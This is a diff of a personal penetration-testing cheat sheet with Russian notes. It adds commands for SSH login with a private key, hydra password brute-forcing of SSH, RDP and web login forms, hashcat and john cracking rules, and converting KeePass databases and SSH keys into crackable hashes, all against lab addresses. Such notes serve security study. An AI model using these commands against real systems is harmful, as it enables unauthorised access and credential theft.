@@ -59,6 +59,9 @@ picture upload - possible reverse shell (php file uploading)
 python -c 'import pty; pty.spawn("/bin/bash")'
 	запуск удобной командной оболочки, предватительно проверить, есть ли питон, иначе - другая командя для tty shell
 	echo $0 - в каком шеле мы находимся (в каком скрипте)
+
+ssh -i id_rsa -p 2222 dave@192.168.178.201
+	id_rsa - private key, используется с парольной фразой, которую также запросят ввести, файл должен иметь права 600 (!!!)
 Первым делом на удаленной машине:
 id
 pwd
@@ -160,20 +163,26 @@ hydra -l username -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.2
 	перебор паролей для пользователя username, порт 2222
 hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202
 	перебор имен для известного пароля
-hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"
-	перебор паролей для user по запросу из burp
+hydra -l user -P /usr/share/wordlists/fasttrack.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed"
+	перебор паролей для user по запросу из burp, перебор из сокращенного набора паролей fasttrack.txt
 hydra -l admin -P passes.txt 192.168.1.1 http-get /admin
 	HTTP Basic Auth (в браузере выскакивает окошко логина): GET /admin HTTP/1.1 \nAuthorization: Basic YWRtaW46cGFzcw==
 hydra -L users.txt -P passes.txt 192.168.1.1 http-get-form "/path:param1=^USER^&param2=^PASS^:Error_string"
 	GET параметры в URL (логин через URL типа ?user=admin&pass=123): GET /login?user=admin&pass=123
 curl -X POST http://192.168.192.201/index.php -d "fm_usr=user&fm_pwd=test"
 	проверить вручную
+hashcat -r demo.rule --stdout demo.txt
+	создать список паролей с мутацией согласно правилу demo.rule
 hashcat -m 0 <hash> /usr/share/wordlists/rockyou.txt -r demo.rule --force
 	взлом хеша типа -m 0 (MD5) по словарю и правилам из файла demo.rule, без вывода предупреждений (--force), используется CPU
 hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
 	взлом файла программы keepass
+john --wordlist=passwords.txt --rules=sshlabrules ssh.hash 
+	когда hashcat не работает, правила предваринельно добавлены в /etc/john/john.conf с заголовком [List.Rules:sshLabRules]
+	ssh.hash - файл с хешем, полученным как результат ssh2hash
 hashid или hash-identifier	проверить тип хеша
-keepass2john	преобразовать *.kdbx файл в читаемый johntheripper, не забыть удалить заголовок "Database:"
+keepass2john db.kdbx > keepass.hash	преобразовать *.kdbx файл в читаемый johntheripper, не забыть удалить заголовок "Database:"
+ssh2hash id_rsa > ssh.hash		преобразовать private key в хеш и удалить заголовок "id_rsa:"
 medusa
 	broutforce attack
 hash-identifier
